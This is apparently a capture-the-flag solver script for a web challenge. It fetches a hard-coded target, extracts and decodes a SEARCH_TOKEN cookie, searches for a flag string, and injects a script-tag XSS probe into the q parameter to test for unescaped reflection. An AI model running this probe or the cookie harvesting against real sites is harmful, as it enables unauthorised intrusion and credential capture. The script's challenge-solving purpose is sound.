#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
Challenge 06 reflected XSS helper.

For the current instance, the important credential is sent in the
SEARCH_TOKEN cookie. This script fetches the page, extracts and URL-decodes
that cookie, then performs a small reflected-input check on the q parameter.
"""

import argparse
import html
import os
import re
import sys
from http.cookies import SimpleCookie
from urllib.parse import quote, unquote, urljoin

import requests

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = "http://47.120.47.61:33319/"
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")
TOKEN_NAME = "SEARCH_TOKEN"


def make_session() -> requests.Session:
    session = requests.Session()
    session.trust_env = False
    session.headers.update({"User-Agent": "gkdctf-06-helper/1.0"})
    return session


def normalize_base_url(url: str) -> str:
    return url.rstrip("/") + "/"


def extract_set_cookie_token(response: requests.Response, token_name: str = TOKEN_NAME) -> str | None:
    raw_cookie = response.headers.get("Set-Cookie", "")
    if not raw_cookie:
        return None

    cookie = SimpleCookie()
    cookie.load(raw_cookie)
    if token_name not in cookie:
        return None

    return unquote(cookie[token_name].value)


def extract_flag(*texts: str) -> str | None:
    for text in texts:
        match = FLAG_RE.search(text or "")
        if match:
            return match.group(0)
    return None


def preview(text: str, max_len: int = 260) -> str:
    text = re.sub(r"\s+", " ", text or "").strip()
    if len(text) <= max_len:
        return text
    return text[:max_len] + "..."


def reflected_check(session: requests.Session, base_url: str, timeout: float) -> bool:
    marker = "gkdctf_xss_probe_6"
    payload = f'"><script>console.log("{marker}")</script>'
    response = session.get(base_url, params={"q": payload}, timeout=timeout)

    print(f"[*] Reflection check: HTTP {response.status_code}, len={len(response.text)}")
    reflected_raw = payload in response.text
    reflected_escaped = html.escape(payload, quote=True) in response.text

    if reflected_raw:
        print("[+] q parameter is reflected without HTML escaping.")
        print(f"[*] Example URL: {base_url}?q={quote(payload)}")
        return True

    if reflected_escaped:
        print("[*] q parameter is reflected, but appears HTML-escaped.")
        return False

    print("[*] q parameter was not reflected as the exact probe.")
    return False


def solve(args: argparse.Namespace) -> str | None:
    base_url = normalize_base_url(args.url)
    session = make_session()

    print(f"[*] Target: {base_url}")
    response = session.get(urljoin(base_url, "./"), timeout=args.timeout)
    print(f"[*] Home: HTTP {response.status_code}, len={len(response.text)}")

    token = extract_set_cookie_token(response)
    if token:
        print(f"[+] {TOKEN_NAME}: {token}")
    else:
        print(f"[-] {TOKEN_NAME} not found in Set-Cookie.")

    flag = extract_flag(token or "", response.text)

    if args.check_reflection:
        print()
        reflected_check(session, base_url, args.timeout)

    if args.show_body:
        print("\n[*] Body preview:")
        print(preview(response.text))

    return flag


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Fetch challenge 06 SEARCH_TOKEN and check reflection")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"target base URL, default: {DEFAULT_URL}")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP timeout in seconds")
    parser.add_argument("--check-reflection", action="store_true", help="test whether q is raw-reflected")
    parser.add_argument("--show-body", action="store_true", help="print a short homepage preview")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    try:
        flag = solve(args)
    except requests.RequestException as exc:
        print(f"[-] Request failed: {exc}", file=sys.stderr)
        return 1

    if not flag:
        print("\n[-] Flag not found. Try --show-body and inspect headers manually.")
        return 2

    print(f"\n[+] FLAG: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
